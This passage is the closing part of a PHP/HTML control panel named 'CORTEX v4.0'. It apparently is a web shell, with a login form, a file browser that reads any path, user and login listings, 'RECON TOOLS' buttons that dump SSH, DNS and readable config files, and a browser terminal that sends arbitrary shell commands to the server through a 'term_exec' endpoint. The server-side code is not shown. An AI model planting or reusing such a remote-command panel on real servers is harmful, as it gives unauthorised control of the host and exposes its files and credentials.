                    <div class="panel-body" style="overflow-x:auto">
                        <table class="tbl" id="users-tbl">
                            <thead>
                                <tr>
                                    <th>USER</th>
                                    <th>UID</th>
                                    <th>GID</th>
                                    <th>HOME</th>
                                    <th>SHELL</th>
                                </tr>
                            </thead>
                            <tbody></tbody>
                        </table>
                    </div>
                </div>
                <div class="panel">
                    <div class="panel-head"><span class="panel-title">📋 LAST LOGINS</span></div>
                    <div class="panel-body">
                        <pre class="log-viewer" id="lastlogins-content"></pre>
                    </div>
                </div>
            </div>
        </div>

        <!-- SERVICES -->
        <div id="sec-services" class="section">
            <div class="dash-grid-wide">
                <div class="panel">
                    <div class="panel-head"><span class="panel-title">⚙️ RUNNING SERVICES</span><button
                            class="btn btn-sm" onclick="loadServices()">Refresh</button></div>
                    <div class="panel-body">
                        <pre class="log-viewer" id="services-content"></pre>
                    </div>
                </div>
                <div class="panel">
                    <div class="panel-head"><span class="panel-title">🔒 FIREWALL</span></div>
                    <div class="panel-body">
                        <pre class="log-viewer" id="firewall-content"></pre>
                    </div>
                </div>
            </div>
        </div>

        <!-- RECON -->
        <div id="sec-recon" class="section">
            <div class="panel">
                <div class="panel-head"><span class="panel-title">🔍 RECON TOOLS</span></div>
                <div class="panel-body">
                    <div class="qcmd-grid" style="grid-template-columns:repeat(auto-fill,minmax(200px,1fr))">
                        <button class="btn"
                            onclick="openTerminalAndRun('route -n 2>/dev/null||ip route')">ROUTES</button>
                        <button class="btn" onclick="openTerminalAndRun('cat /etc/resolv.conf')">DNS CONFIG</button>
                        <button class="btn" onclick="openTerminalAndRun('cat /etc/ssh/sshd_config|grep -v \" ^#\"')">SSH
                            CONFIG</button>
                        <button class="btn" onclick="openTerminalAndRun('find / -name \" *.conf\" -readable
                            2>/dev/null|head -30')">READABLE CONFS</button>
                    </div>
                </div>
            </div>
        </div>

    </div>

    <!-- NATIVE WEB TERMINAL -->
    <div class="term-overlay" id="term-overlay">
        <div class="term-bar">
            <div class="term-bar-title">💻 INTERACTIVE NATIVE TERMINAL</div>
            <div><button class="btn btn-sm btn-cyan" onclick="termClear()">CLEAR</button> <button
                    class="btn btn-sm btn-danger" onclick="closeTerminal()">✕ CLOSE</button></div>
        </div>
        <div class="term-body" id="term-body" onclick="document.getElementById('term-input').focus()">
            <div class="term-body-inner">
                <div class="term-history" id="term-history">Welcome to CORTEX Native Terminal Emulator.
                    Provides real-time execution with CWD tracking, history, ANSI colors, and basic tab completion.
                    Type 'clear' to clear screen. Use arrow keys for history. Tab for autocomplete.
                    -------------------------------------------------------------------------------
                </div>
                <div class="term-active-line">
                    <span class="term-prompt" id="term-prompt">user@host:/$ </span>
                    <div class="term-input-wrap">
                        <input type="text" class="term-input" id="term-input" autocomplete="off" spellcheck="false"
                            autofocus>
                    </div>
                </div>
            </div>
        </div>
        <div class="term-status"><span id="term-cwd-display">/</span> | PTY emulator mode</div>
    </div>

    <script>
        // --- GLOBAL STATE ---
        const API = '?api=';
        let curSection = 'dashboard';

        // NAVIGATION
        document.querySelectorAll('.nav-btn[data-section]').forEach(b => {
            b.addEventListener('click', function () {
                document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
                document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
                document.getElementById('sec-' + this.dataset.section).classList.add('active');
                this.classList.add('active');
                curSection = this.dataset.section;
                onSectionLoad(curSection);
            });
        });

        function onSectionLoad(sec) {
            if (sec === 'processes') loadProcesses();
            if (sec === 'network') loadConnections();
            if (sec === 'disks') loadDisks();
            if (sec === 'files') fbGo('/');
            if (sec === 'logs') loadLog('syslog');
            if (sec === 'users') { loadUsers(); loadLastLogins(); }
            if (sec === 'services') { loadServices(); loadFirewall(); }
        }

        // DASHBOARD UPDATES
        async function fetchSysInfo() {
            try {
                const r = await fetch(API + 'sysinfo'); const d = await r.json();
                const setTxt = (id, v) => { if (document.getElementById(id)) document.getElementById(id).textContent = v; };
                setTxt('cpu-pct', d.cpu.usage + '%'); setTxt('cpu-badge', d.cpu.usage + '%'); setTxt('hud-cpu', d.cpu.usage + '%');
                setTxt('ram-pct', d.mem.pct + '%'); setTxt('ram-badge', d.mem.pct + '%'); setTxt('hud-mem', d.mem.pct + '%');
                setTxt('ram-used', d.mem.used + ' MB'); setTxt('ram-total', d.mem.total + ' MB');
                document.getElementById('g-cpu').style.strokeDashoffset = 314.16 - (d.cpu.usage / 100) * 314.16;
                document.getElementById('g-ram').style.strokeDashoffset = 314.16 - (d.mem.pct / 100) * 314.16;
            } catch (e) { }
        }
        fetchSysInfo(); setInterval(() => { if (curSection === 'dashboard') fetchSysInfo(); }, 5000);

        // OTHER SECTIONS
        const esc = s => { if (s == null) return ''; const d = document.createElement('div'); d.textContent = s; return d.innerHTML; };

        async function loadProcesses(sort) {
            const r = await fetch(API + 'processes&sort=' + (sort || 'cpu')); const d = await r.json();
            document.querySelector('#proc-tbl tbody').innerHTML = d.map(p => `<tr><td>${esc(p.pid)}</td><td>${esc(p.u)}</td><td>${p.cpu}%</td><td>${p.mem}%</td><td>${esc(p.stat)}</td><td>${esc(p.time)}</td><td>${esc(p.cmd)}</td><td><button class="btn btn-sm btn-danger" onclick="openTerminalAndRun('kill -9 ${p.pid}')">KILL</button></td></tr>`).join('');
        }

        async function loadConnections() {
            const r = await fetch(API + 'connections'); const d = await r.json();
            document.querySelector('#conn-tbl tbody').innerHTML = d.map(c => `<tr><td>${esc(c.proto)}</td><td style="color:var(--cyan)">${esc(c.state)}</td><td>${esc(c.local)}</td><td>${esc(c.foreign)}</td><td>${esc(c.proc)}</td></tr>`).join('');
        }

        function loadDisks() {
            const disks = <?php echo json_encode($SI['disks']); ?>;
            document.getElementById('disks-content').innerHTML = disks.map(d => `<div style="margin-bottom:12px"><div style="display:flex;justify-content:space-between;font-size:.8rem;margin-bottom:4px"><span style="color:var(--cyan)">${esc(d.dev)}</span><span>${esc(d.mount)}</span><span>${esc(d.used)}/${esc(d.size)} (${d.pct}%)</span></div><div class="disk-bar-bg"><div class="disk-bar-fill" style="width:${d.pct}%;${d.pct > 80 ? 'background:var(--red)' : ''}"></div></div></div>`).join('');
        }

        async function fbGo(path) {
            document.getElementById('fb-path-input').value = path;
            const r = await fetch(API + 'filebrowser&path=' + encodeURIComponent(path)); const d = await r.json();
            document.getElementById('fb-path-input').value = d.path;
            document.getElementById('fb-list').innerHTML = d.items.map(f => `<div class="fb-item" data-path="${esc(f.path)}" data-dir="${f.dir ? 1 : 0}" onclick="fbClick(this)"><span>${f.dir ? '📁' : '📄'}</span><span style="flex:1">${esc(f.name)}</span><span style="opacity:.5">${f.perms}</span></div>`).join('');
        }

        function fbClick(el) {
            const path = el.dataset.path;
            if (el.dataset.dir === "1") fbGo(path); else fbReadFile(path);
        }

        async function fbReadFile(path) {
            const r = await fetch(API + 'readfile&path=' + encodeURIComponent(path)); const d = await r.json();
            document.getElementById('fb-file-name').textContent = d.path;
            document.getElementById('fb-file-content').textContent = d.content || d.error;
            document.getElementById('fb-file-viewer').style.display = 'block';
        }

        async function loadLog(type) {
            const r = await fetch(API + 'logs&type=' + type); const d = await r.json();
            document.getElementById('log-content').textContent = d.data;
        }
        async function loadUsers() {
            const r = await fetch(API + 'users'); document.querySelector('#users-tbl tbody').innerHTML = (await r.json()).map(u => `<tr><td>${esc(u.name)}</td><td>${u.uid}</td><td>${u.gid}</td><td>${esc(u.home)}</td><td>${esc(u.shell)}</td></tr>`).join('');
        }
        async function loadLastLogins() { const r = await fetch(API + 'lastlogins'); document.getElementById('lastlogins-content').textContent = (await r.json()).data; }
        async function loadServices() { const r = await fetch(API + 'services'); document.getElementById('services-content').textContent = (await r.json()).data; }
        async function loadFirewall() { const r = await fetch(API + 'firewall'); document.getElementById('firewall-content').textContent = (await r.json()).data; }


        // ====== NATIVE TERMINAL JS ======
        const termHist = [];
        let termHistIdx = 0;
        let isExecuting = false;
        let termCwd = '/';

        async function initTerminal() {
            const r = await fetch(API + 'term_cwd'); const d = await r.json();
            termCwd = d.cwd;
            document.getElementById('term-prompt').innerHTML = `<span class="term-color-green">${esc(d.user)}@${esc(d.host)}</span>:<span class="term-color-blue">${esc(d.cwd)}</span>$ `;
            document.getElementById('term-cwd-display').textContent = d.cwd;
        }

        function openTerminalAndRun(cmd) {
            openTerminal();
            termPrintPrompt();
            termPrint(cmd + '\n');
            executeCommand(cmd);
        }

        function openTerminal() {
            document.getElementById('term-overlay').classList.add('active');
            initTerminal().then(() => document.getElementById('term-input').focus());
        }

        function closeTerminal() { document.getElementById('term-overlay').classList.remove('active'); }

        // Basic ANSI parser for terminal colors
        function parseAnsi(text) {
            return esc(text)
                .replace(/\x1b\[31m/g, '<span class="term-color-red">')
                .replace(/\x1b\[32m/g, '<span class="term-color-green">')
                .replace(/\x1b\[33m/g, '<span class="term-color-yellow">')
                .replace(/\x1b\[34m/g, '<span class="term-color-blue">')
                .replace(/\x1b\[36m/g, '<span class="term-color-cyan">')
                .replace(/\x1b\[1m/g, '<span class="term-color-bold">')
                .replace(/\x1b\[0m/g, '</span>');
        }

        function termPrint(text, raw = false) {
            const hist = document.getElementById('term-history');
            const span = document.createElement('span');
            span.innerHTML = raw ? text : parseAnsi(text);
            hist.appendChild(span);
            setTimeout(() => document.getElementById('term-body').scrollTop = document.getElementById('term-body').scrollHeight, 10);
        }

        function termPrintPrompt() {
            const promptHtml = document.getElementById('term-prompt').innerHTML;
            termPrint(promptHtml, true);
        }

        function termClear() {
            document.getElementById('term-history').innerHTML = '';
        }

        async function executeCommand(cmd) {
            if (cmd.trim() !== '') {
                termHist.push(cmd);
                termHistIdx = termHist.length;
            }

            if (cmd.trim() === 'clear') {
                termClear();
                return;
            }

            isExecuting = true;
            document.getElementById('term-input').disabled = true;

            try {
                const formData = new URLSearchParams();
                formData.append('cmd', cmd);
                const r = await fetch(API + 'term_exec', { method: 'POST', body: formData });
                const d = await r.json();

                if (d.output) termPrint(d.output + (d.output.endsWith('\n') ? '' : '\n'));

                // Update prompt
                termCwd = d.cwd;
                document.getElementById('term-cwd-display').textContent = d.cwd;
                document.getElementById('term-prompt').innerHTML = `<span class="term-color-green">${esc(d.user)}@${esc(d.host)}</span>:<span class="term-color-blue">${esc(d.cwd)}</span>$ `;

            } catch (e) {
                termPrint('<span class="term-color-red">Execution Error: ' + esc(e.message) + '</span>\n', true);
            }

            isExecuting = false;
            document.getElementById('term-input').value = '';
            document.getElementById('term-input').disabled = false;
            document.getElementById('term-input').focus();
        }

        // Keydown handler for terminal
        document.getElementById('term-input').addEventListener('keydown', async function (e) {
            if (isExecuting) { e.preventDefault(); return; }

            if (e.key === 'Enter') {
                const cmd = this.value;
                this.value = '';
                termPrintPrompt();
                termPrint(cmd + '\n');
                executeCommand(cmd);
            }
            else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (termHistIdx > 0) {
                    termHistIdx--;
                    this.value = termHist[termHistIdx];
                }
            }
            else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (termHistIdx < termHist.length - 1) {
                    termHistIdx++;
                    this.value = termHist[termHistIdx];
                } else {
                    termHistIdx = termHist.length;
                    this.value = '';
                }
            }
            else if (e.key === 'Tab') {
                e.preventDefault();
                const cmd = this.value;
                if (!cmd.trim()) return;

                const formData = new URLSearchParams();
                formData.append('cmd', cmd);
                const r = await fetch(API + 'term_tab', { method: 'POST', body: formData });
                const d = await r.json();

                if (d.matches && d.matches.length > 0) {
                    if (d.matches.length === 1) {
                        // Autocomplete single match
                        const parts = cmd.split(' ');
                        parts.pop();
                        parts.push(d.matches[0]);
                        this.value = parts.join(' ');
                    } else {
                        // Show multiple options
                        termPrintPrompt();
                        termPrint(cmd + '\n');
                        termPrint(d.matches.join('  ') + '\n');
                        // Re-prompt visually (simulated) by not changing input but waiting for more
                    }
                }
            }
            else if (e.ctrlKey && e.key === 'c') {
                e.preventDefault();
                termPrintPrompt();
                termPrint(this.value + '^C\n');
                this.value = '';
            }
            else if (e.ctrlKey && e.key === 'l') {
                e.preventDefault();
                termClear();
            }
        });

        // F2 quick terminal
        document.addEventListener('keydown', e => {
            if (e.key === 'F2') {
                e.preventDefault();
                if (document.getElementById('term-overlay').classList.contains('active')) closeTerminal();
                else openTerminal();
            }
        });
    </script>
</body>

</html>
<?php
// === LOGIN MODAL FORM ===
function showLogin($error = null)
{
    ?>
    <!DOCTYPE html>
    <html lang="es">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ACCESS // CORTEX</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box
            }

            body {
                background: #0a0a0f;
                color: #00ff41;
                font-family: 'Courier New', monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh
            }

            .login-box {
                width: 400px;
                background: linear-gradient(135deg, #0d0d14, #12121c);
                border: 1px solid #00ff41;
                padding: 40px;
                box-shadow: 0 0 30px rgba(0, 255, 65, .1)
            }

            .form-input {
                width: 100%;
                padding: 12px;
                background: rgba(0, 0, 0, .5);
                border: 1px solid #1a1a2e;
                color: #00ff41;
                margin-bottom: 20px;
                font-family: inherit;
                outline: none
            }

            .form-input:focus {
                border-color: #00ff41;
                box-shadow: 0 0 15px rgba(0, 255, 65, .2)
            }

            .login-btn {
                width: 100%;
                padding: 14px;
                background: transparent;
                border: 1px solid #00ff41;
                color: #00ff41;
                font-family: inherit;
                cursor: pointer;
                text-transform: uppercase;
                transition: all .3s
            }

            .login-btn:hover {
                background: #00ff41;
                color: #000;
                box-shadow: 0 0 20px rgba(0, 255, 65, .5)
            }

            .error {
                background: rgba(255, 0, 64, .1);
                border: 1px solid #ff0040;
                color: #ff0040;
                padding: 10px;
                margin-bottom: 20px;
                text-align: center
            }
        </style>
    </head>

    <body>
        <div class="login-box">
            <h1 style="text-align:center;margin-bottom:30px;letter-spacing:5px;text-shadow:0 0 10px #00ff41">CORTEX v4.0
            </h1>
            <?php if ($error): ?>
                <div class="error">⚠ <?php echo htmlspecialchars($error); ?></div><?php endif; ?>
            <form method="POST">
                <input type="hidden" name="login" value="1">
                <label style="display:block;margin-bottom:5px;opacity:.6;font-size:12px">USERNAME</label>
                <input type="text" name="username" class="form-input" required autofocus>
                <label style="display:block;margin-bottom:5px;opacity:.6;font-size:12px">PASSWORD</label>
                <input type="password" name="password" class="form-input" required>
                <button type="submit" class="login-btn">ACCESS SYSTEM</button>
            </form>
        </div>
    </body>

    </html>
<?php } ?>
